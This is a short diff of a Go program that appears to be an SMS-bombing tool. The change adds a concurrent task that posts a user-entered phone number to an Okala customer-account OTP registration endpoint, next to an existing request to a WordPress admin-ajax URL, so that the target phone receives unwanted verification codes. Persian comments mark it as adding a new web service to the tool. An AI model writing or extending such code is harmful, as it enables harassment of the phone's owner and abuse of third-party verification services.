@@ -1570,11 +1570,17 @@ func main() {
 			sendFormRequest(ctx, "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
 
-		// apigateway.okala.com (JSON) - تکراری با اصلاح payload
+// apigateway.okala.com (JSON) - اضافه کردن وب سرویس جدید
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
-				"mobile": phone, // استفاده از متغیر phone واقعی
+				"mobile": phone, // استفاده از متغیر phone که کاربر وارد کرده
+				"confirmTerms": true,
+				"notRobot": false,
+				"ValidationCodeCreateReason": 5,
+				"OtpApp": 0,
+				"IsAppOnly": false,
+				"deviceTypeCode": 7,
 			}, &wg, ch)
 		}
 
